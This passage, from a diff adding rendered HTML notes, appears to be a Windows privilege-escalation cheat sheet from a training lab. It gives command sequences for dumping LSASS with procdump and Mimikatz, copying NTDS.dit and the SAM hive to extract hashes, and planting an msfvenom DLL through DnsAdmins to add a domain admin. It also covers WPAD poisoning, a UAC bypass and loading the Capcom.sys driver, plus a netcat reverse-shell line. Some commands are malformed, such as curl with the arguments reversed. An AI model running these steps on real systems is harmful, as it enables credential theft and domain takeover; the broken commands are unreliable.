+<li>Migrate the process with the meterpreter :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">migrate &lt;pid&gt;</span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Dump LSASS:</strong></p>
+<ul>
+<li>Download procdump.exe:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://download.sysinternals.com/files/Procdump.zip</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Run procdump:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Download Mimikatz:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://github.com/ParrotSec/mimikatz/tree/master/x64</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Use Mimikatz:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">mimikatz.exe
+</span></span><span class="line"><span class="cl">mimikatz # log
+</span></span><span class="line"><span class="cl">mimikatz # sekurlsa::minidump lsass.dmp
+</span></span><span class="line"><span class="cl">mimikatz # sekurlsa::logonpasswords</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Dump Locally :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">pypykatz lsa minidump lsass.dmp</span></span></code></pre></div>
+  </figure>
+</div>
+<p>https://github.com/skelsec/pypykatz</p>
+<p><strong>Tools:</strong></p>
+<ul>
+<li>Download psgetsystem from:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Run command:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">import-module</span> <span class="p">.\</span><span class="n">psgetsys</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Get-Process</span> <span class="n">winlogon</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">MyProcess</span><span class="p">]::</span><span class="n">CreateProcessFromParent</span><span class="p">(</span><span class="s2">&#34;552&#34;</span><span class="p">,</span><span class="s2">&#34;c:\windows\system32\cmd.exe&#34;</span><span class="p">,</span> <span class="s2">&#34;/c c:\windows\temp\nc.exe 127.0.0.1 4444 -e cmd.exe&#34;</span><span class="p">)</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Download SeDebugPrivilegePoC from:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC</span></span></code></pre></div>
+  </figure>
+</div>
+<h4 id="setakeownershipprivilege">SeTakeOwnershipPrivilege:<a href="#setakeownershipprivilege" class="anchor" aria-hidden="true">#</a> </h4>
+<p>#SeTakeOwnershipPrivilege</p>
+<p><strong>View File Ownership:</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"> <span class="n">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="o">-</span><span class="n">Path</span> <span class="s1">&#39;C:\Department Shares\Private\IT\cred.txt&#39;</span> <span class="o">|</span> <span class="n">select</span> <span class="n">name</span><span class="p">,</span><span class="n">directory</span><span class="p">,</span> <span class="o">@</span><span class="p">{</span><span class="n">Name</span><span class="o">=</span><span class="s2">&#34;Owner&#34;</span><span class="p">;</span><span class="n">Expression</span><span class="o">=</span><span class="p">{(</span><span class="n">Get</span><span class="o">-</span><span class="n">ACL</span> <span class="err">$</span><span class="n">_</span><span class="o">.</span><span class="n">Fullname</span><span class="p">)</span><span class="o">.</span><span class="n">Owner</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cmd</span> <span class="o">/</span><span class="n">c</span> <span class="nb">dir</span> <span class="o">/</span><span class="n">q</span> <span class="s1">&#39;C:\Department Shares\Private\IT&#39;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Change File Ownership:</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">takeown</span> <span class="o">/</span><span class="n">f</span> <span class="s1">&#39;C:\Department Shares\Private\IT\cred.txt&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">icacls</span> <span class="s1">&#39;C:\Department Shares\Private\IT\cred.txt&#39;</span> <span class="o">/</span><span class="n">grant</span> <span class="n">htb</span><span class="o">-</span><span class="n">student</span><span class="p">:</span><span class="n">F</span></span></span></code></pre></div>
+  </figure>
+</div>
+<h3 id="windows-group-privileges">Windows Group Privileges<a href="#windows-group-privileges" class="anchor" aria-hidden="true">#</a> </h3>
+<h4 id="backup-operators">Backup Operators<a href="#backup-operators" class="anchor" aria-hidden="true">#</a> </h4>
+<p>#Backup_Operators</p>
+<p><strong>Copying a Protected File:</strong></p>
+<ul>
+<li>Download modules:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Import modules:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">SeBackupPrivilegeUtils</span><span class="p">.</span><span class="py">dll</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">SeBackupPrivilegeCmdLets</span><span class="p">.</span><span class="n">dll</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Enable SeBackupPrivilege:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-SeBackupPrivilege</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-SeBackupPrivilege</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Copy Protected file:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Copy-FileSeBackupPrivilege</span> <span class="s1">&#39;C:\Confidential\2021 Contract.txt&#39;</span> <span class="p">.\</span><span class="n">Contract</span><span class="p">.</span><span class="n">txt</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Copying NTDS.dit:</strong></p>
+<ul>
+<li>Download Robocopy :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Use Diskshadow :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">diskshadow</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="nb">set </span><span class="n">verbose</span> <span class="n">on</span>
+</span></span><span class="line"><span class="cl"><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="nb">set </span><span class="n">metadata</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">meta</span><span class="p">.</span><span class="py">cab</span>
+</span></span><span class="line"><span class="cl"><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="nb">set </span><span class="n">context</span> <span class="n">clientaccessible</span>
+</span></span><span class="line"><span class="cl"><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="nb">set </span><span class="n">context</span> <span class="n">persistent</span>
+</span></span><span class="line"><span class="cl"><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="k">begin</span> <span class="n">backup</span>
+</span></span><span class="line"><span class="cl"><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="n">add</span> <span class="n">volume</span> <span class="n">C:</span> <span class="nb">alias</span> <span class="n">cdrive</span>
+</span></span><span class="line"><span class="cl"><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="n">create</span>
+</span></span><span class="line"><span class="cl"><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="n">expose</span> <span class="k">%</span><span class="n">cdrive</span><span class="p">%</span> <span class="n">E:</span>
+</span></span><span class="line"><span class="cl"><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="k">end</span> <span class="n">backup</span>
+</span></span><span class="line"><span class="cl"><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="c">#You can put all this command in a script.txt and exec diskshadow.exe -s script.exe</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Run Robocopy:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">robocopy /B E:\Windows\NTDS .\ntds ntds.dit</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Copying NTDS.dit Locally :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Copy-FileSeBackupPrivilege</span> <span class="n">E:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">NTDS</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="py">dit</span> <span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>#SeBackupPrivilege :
+<strong>Extract local account credentials :</strong></p>
+<ul>
+<li>Extracting Sytem and Sam :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">reg save HKLM\SYSTEM SYSTEM.SAV
+</span></span><span class="line"><span class="cl">reg save HKLM\SAM SAM.SAV</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Use Impacket :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">secretsdump.py -sam SAM.SAV -system SYSTEM.SAV LOCAL</span></span></code></pre></div>
+  </figure>
+</div>
+<p>**Extracting Credentials from NTDS.dit : **</p>
+<ul>
+<li>Download DSInternals :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://github.com/MichaelGrafnetter/DSInternals/blob/master/Src/DSInternals.PowerShell/DSInternals.psd1</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Use DSInternals:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">DSInternals</span><span class="p">.</span><span class="py">psd1</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$key</span> <span class="p">=</span> <span class="nb">Get-BootKey</span> <span class="n">-SystemHivePath</span> <span class="p">.\</span><span class="n">SYSTEM</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ADDBAccount</span> <span class="n">-DistinguishedName</span> <span class="s1">&#39;CN=administrator,CN=users,DC=inlanefreight,DC=local&#39;</span> <span class="n">-DBPath</span> <span class="p">.\</span><span class="n">ntds</span><span class="p">.</span><span class="py">dit</span> <span class="n">-BootKey</span> <span class="nv">$key</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Use Impacket  :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL</span></span></code></pre></div>
+  </figure>
+</div>
+<h4 id="event-log-readers">Event Log Readers<a href="#event-log-readers" class="anchor" aria-hidden="true">#</a> </h4>
+<p>#Event_Log_Readers</p>
+<ul>
+<li>Confirming Group Membership :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net localgroup <span class="s2">&#34;Event Log Readers&#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Searching Security Logs :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">wevtutil qe Security /rd:true /f:text <span class="p">|</span> Select-String <span class="s2">&#34;/user&#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Searching Security Logs with Credential :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 <span class="p">|</span> findstr <span class="s2">&#34;/user&#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Searching Security Logs Using Get-WinEvent :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-WinEvent</span> <span class="n">-LogName</span> <span class="n">security</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="py">ID</span> <span class="o">-eq</span> <span class="mf">4688</span> <span class="o">-and</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="mf">8</span><span class="p">].</span><span class="py">Value</span> <span class="o">-like</span> <span class="s1">&#39;*/user*&#39;</span><span class="p">}</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="vm">@</span><span class="p">{</span><span class="n">name</span><span class="p">=</span><span class="s1">&#39;CommandLine&#39;</span><span class="p">;</span><span class="n">expression</span><span class="p">={</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="mf">8</span><span class="p">].</span><span class="py">Value</span> <span class="p">}}</span></span></span></code></pre></div>
+  </figure>
+</div>
+<h4 id="dnsadmins">DnsAdmins<a href="#dnsadmins" class="anchor" aria-hidden="true">#</a> </h4>
+<p>#DnsAdmins</p>
+<p><strong>Leveraging DnsAdmins Access</strong></p>
+<ul>
+<li>Generating Malicious DLL :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">msfvenom -p windows/x64/exec <span class="nv">cmd</span><span class="o">=</span><span class="s1">&#39;net group &#34;domain admins&#34; netadm /add /domain&#39;</span> -f dll -o adduser.dll</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Confirming Group Membership :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ADGroupMember</span> <span class="n">-Identity</span> <span class="n">DnsAdmins</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Loading Custom DLL :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll</span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Check restart DNS Privilege :</strong></p>
+<ul>
+<li>Finding User&rsquo;s SID :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">wmic</span> <span class="n">useraccount</span> <span class="nb">where </span><span class="n">name</span><span class="p">=</span><span class="s2">&#34;netadm&#34;</span> <span class="n">get</span> <span class="n">sid</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Checking Permissions on DNS Service :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">sc</span><span class="p">.</span><span class="py">exe</span> <span class="n">sdshow</span> <span class="n">DNS</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Restart Dns service :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sc stop dns
+</span></span><span class="line"><span class="cl">sc start dns</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Confirming Group Membership :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">net</span> <span class="nb">group </span><span class="s2">&#34;Domain Admins&#34;</span> <span class="p">/</span><span class="n">dom</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><code>Don't forget to logout or restart your sessions to apply the change !!</code></p>
+<p><strong>Using Mimilib.dll</strong></p>
+<p>As detailed in this <a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html">post</a>, we could also utilize <a href="https://github.com/gentilkiwi/mimikatz/tree/master/mimilib">mimilib.dll</a> from the creator of the <code>Mimikatz</code> tool to gain command execution by modifying the <a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c">kdns.c</a> file to execute a reverse shell one-liner or another command of our choosing.</p>
+<p><strong>Creating a WPAD Record</strong></p>
+<ul>
+<li>Disabling the Global Query Block List</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-DnsServerGlobalQueryBlockList</span> <span class="n">-Enable</span> <span class="vm">$false</span> <span class="n">-ComputerName</span> <span class="n">dc01</span><span class="p">.</span><span class="py">inlanefreight</span><span class="p">.</span><span class="n">local</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Adding a WPAD Record</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Add-DnsServerResourceRecordA</span> <span class="n">-Name</span> <span class="n">wpad</span> <span class="n">-ZoneName</span> <span class="n">inlanefreight</span><span class="p">.</span><span class="py">local</span> <span class="n">-ComputerName</span> <span class="n">dc01</span><span class="p">.</span><span class="py">inlanefreight</span><span class="p">.</span><span class="py">local</span> <span class="n">-IPv4Address</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">16</span><span class="p">.</span><span class="mf">100</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>`Use a tool such as Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes '</p>
+<h4 id="print-operators">Print Operators<a href="#print-operators" class="anchor" aria-hidden="true">#</a> </h4>
+<p>#Print_Operators</p>
+<p><strong>Enable EnableSeLoadDriverPrivilege</strong></p>
+<p><code>if no there is no SeLoadDriverPrivileg we need to bypass UAC  </code></p>
+<ul>
+<li>Bypass UAC :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="ss">https</span><span class="p">:</span><span class="sr">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">hfiref0x</span><span class="o">/</span><span class="no">UACME</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Download  EnableSeLoadDriverPrivilege :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">curl -o https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp EnableSeLoadDriverPrivilege.cpp</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Compile with cl.exe :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Enable EnableSeLoadDriverPrivilege :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">EnableSeLoadDriverPrivilege.exe</span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Load Capcom.sys</strong></p>
+<ul>
+<li>Download  Capcom.sys:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">curl </span><span class="n">Capcom</span><span class="p">.</span><span class="py">sys</span> <span class="n">-o</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">FuzzySecurity</span><span class="p">/</span><span class="nb">Capcom-Rootkit</span><span class="p">/</span><span class="n">blob</span><span class="p">/</span><span class="n">master</span><span class="p">/</span><span class="n">Driver</span><span class="p">/</span><span class="n">Capcom</span><span class="p">.</span><span class="n">sys</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Add Reference to Driver:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">add</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">CAPCOM</span> <span class="p">/</span><span class="n">v</span> <span class="n">ImagePath</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="s2">&#34;\??\C:\Tools\Capcom.sys&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">add</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">CAPCOM</span> <span class="p">/</span><span class="n">v</span> <span class="nb">Type </span><span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="mf">1</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Download DriverView:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">http://www.nirsoft.net/utils/driverview.html</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Verify Capcom Driver is Listed:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
